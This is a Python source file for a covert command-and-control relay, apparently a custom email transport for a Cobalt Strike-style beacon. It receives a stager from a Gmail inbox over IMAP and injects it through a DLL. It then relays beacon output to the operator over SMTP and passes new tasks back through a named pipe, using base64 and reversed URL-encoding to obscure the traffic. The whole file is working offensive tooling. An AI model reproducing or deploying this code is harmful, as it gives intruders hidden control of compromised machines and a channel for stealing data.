from ctypes import *
from ctypes.wintypes import *
import sys
import os
import struct

# Encoder imports:
import base64
import urllib

# Transport imports:
import email
import imaplib
from smtplib import SMTP
from smtplib import SMTP_SSL
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from time import sleep

# START GHETTO CONFIG, should be read in when compiled...
GMAIL_USER = 'example@gmail.com'
GMAIL_PWD = 'hunter2'
SERVER = 'smtp.gmail.com'
#SERVER_PORT = 587
SERVER_PORT = 465
# END GHETTO CONFIG

# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
	data = base64.b64encode(data)
	return urllib.quote_plus(data)[::-1]

def decode(data):
	data = urllib.unquote(data[::-1])
	return base64.b64decode(data)
# </encoder functions>

# <transport functions>
def prepTransport():
	return 0

def sendData(data):
	msg = MIMEMultipart()
	msg['From'] = GMAIL_USER
	msg['To'] = GMAIL_USER
	msg['Subject'] = "Resp4You"
	message_content = encode(data)

	msg.attach(MIMEText(str(message_content)))

	while True:
		try:
			#mailServer = SMTP()
			mailServer = SMTP_SSL(SERVER, SERVER_PORT)
			# mailServer.connect(SERVER, SERVER_PORT)
			#mailServer.ehlo()
			#mailServer.starttls()
			mailServer.login(GMAIL_USER,GMAIL_PWD)
			mailServer.sendmail(GMAIL_USER, GMAIL_USER, msg.as_string())
			mailServer.quit()
			break
		except Exception as e:
			sleep(10) # wait 10 seconds to try again

def recvData():
	c= imaplib.IMAP4_SSL(SERVER)
	c.login(GMAIL_USER, GMAIL_PWD)
	c.select("INBOX")

	#typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'New4You')".format(uniqueid))
	while True:
		typ, id_list = c.search(None, '(UNSEEN SUBJECT "New4You")')
		print id_list[0].split()
		if not id_list[0].split():
			sleep(10) # wait for 10 seconds before checking again
			c.select("INBOX")
			typ, id_list = c.search(None, '(UNSEEN SUBJECT "New4You")')
			pass
		else:
			for msg_id in id_list[0].split():
				msg = c.fetch(msg_id, '(RFC822)')
				#c.store(msg_id, '+FLAGS', '\SEEN')
				msg = ([x[0] for x in msg][1])[1]
				for part in email.message_from_string(msg).walk():
					msg = part.get_payload()
				# print msg
				c.logout()
				return decode(msg)


# </transport functions>

maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe,mem,maxlen)
	if l < 0: return(-1)
	chunk=mem.raw[:l]
	return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
	sys.stdout.write('wp: %s\n'%len(chunk))
	sys.stdout.flush()
	print chunk
	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
	sleep(3) 
	print "ret=%s"%ret
	return(ret)

def go():
	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
	print "Waiting for stager..." # DEBUG
	p = recvData()
	print "Got a stager! loading..."
	sleep(2)
	# print "Decoded stager = " + str(p) # DEBUG
	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
	handle_beacon = start_beacon(p)

	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
	print "Loaded, and got handle to beacon. Getting METADATA."

	return handle_beacon

def interact(handle_beacon):
	while(True):
		sleep(1.5)
		
		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		print "relaying chunk to server"
		sendData(chunk)

		# LOGIC TO CHECK FOR A NEW TASK
		print "Checking for new tasks from transport"
		
		newTask = recvData()

		print "Got new task: %s" % (newTask)
		print "Writing %s bytes to pipe" % (len(newTask))
		r = WritePipe(handle_beacon, newTask)
		print "Write %s bytes to pipe" % (r)

# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# run the main loop
try:
	interact(handle_beacon)
except KeyboardInterrupt:
	print "Caught escape signal"
	sys.exit(0)
